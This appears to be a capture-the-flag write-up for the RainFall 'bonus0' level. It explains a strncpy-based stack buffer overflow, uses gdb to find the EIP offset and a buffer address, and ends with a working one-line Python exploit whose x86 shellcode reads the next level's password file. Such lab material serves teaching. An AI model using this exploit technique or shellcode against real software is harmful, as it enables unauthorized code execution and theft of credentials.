# bonus0

Aka buffer overflow with extra steps.

We have 3 functions:
- `p` takes two arguments, prints the second one with a newline, and reads 4096 characters on `stdin`. It then replaces the newline with a null byte, and calls `strncpy` to copy the 20 first characters to the first parameter.
- `pp` calls p on its two 20 bytes stack buffers and then concatenates both in the buffer it took as argument.
- `main` has a 55 bytes buffer on the stack, which it gives when calling `pp`. It then prints the buffer with a newline.

The first safety issue we can see is that `pp` gives to `p` 20 byte buffers, so `p` might overwrite the null byte.

Since both buffers are adjacent on the stack, if we write 20 characters in the first buffer, we will see that the first buffer "contains" the second one:

```bash
bonus0@RainFall:~$ ./bonus0 
 - 
01234567890123456789
 - 
WOW
01234567890123456789WOW WOW
```

Now, if we input 20 or more characters in both buffers, the 54 bytes buffer in main will be overflown as it will have more than 60 bytes written in (2 * 20 for buffer 1 + 20 for buffer 2 + whatever is after buffer 2 in memory).

```bash
bonus0@RainFall:~$ ./bonus0 
 - 
01234567890123456789
 - 
WOW
01234567890123456789WOW WOW
bonus0@RainFall:~$ ./bonus0 
 - 
01234567890123456789
 - 
ABCDEFGHIJKLMNOPQRSTUVWXYZ
01234567890123456789ABCDEFGHIJKLMNOPQRST��� ABCDEFGHIJKLMNOPQRST���
Segmentation fault (core dumped)
```

The program segfaults because the `EIP` value in main's stack is overwritten. That's interesting!

```gdb
(gdb) r
Starting program: /home/user/bonus0/bonus0 
 - 
01234567890123456789
 - 
ABCDEFGHIJKLMNOPQRSTUVWXYZ
01234567890123456789ABCDEFGHIJKLMNOPQRST��� ABCDEFGHIJKLMNOPQRST���

Program received signal SIGSEGV, Segmentation fault.
0x4d4c4b4a in ?? ()
```

The bytes `4d4c4b4a` correspond to `MLKJ`, so we know where to put the address we want to overwrite `EIP` with.

We can now store our shellcode in the huge buffer in `p`, as it will not be overwritten. We get the address like so:

```gdb
(gdb) b * 0x080484e1
Breakpoint 1 at 0x80484e1
(gdb) r
Starting program: /home/user/bonus0/bonus0 
 - 

Breakpoint 1, 0x080484e1 in p ()
(gdb) x/x $eax+20
0xbfffe684:	0x00
```

We'll put our shellcode just after the 20 first characters at 0xbfffe684.

One small note, since GDB calls the process with the absolute path as `argv[0]`, we'll need to do the same in order the have the stack in the same state.

Now we have all the info needed for our exploit!

```bash
python -c 'print "a"*4095 + "\n" + "z"*9 + "\xbf\xff\xe6\x84"[::-1] + "z"*7 + "\x31\xd2\x31\xc0\x52\x68pass\x681//.\x68onus\x68er/b\x68e/us\x68/hom\x89\xe1\x50\x68/cat\x68/bin\x89\xe3\x50\x51\x53\x89\xe1\xb0\x0b\xcd\x80"' | /home/user/bonus0/bonus0
```
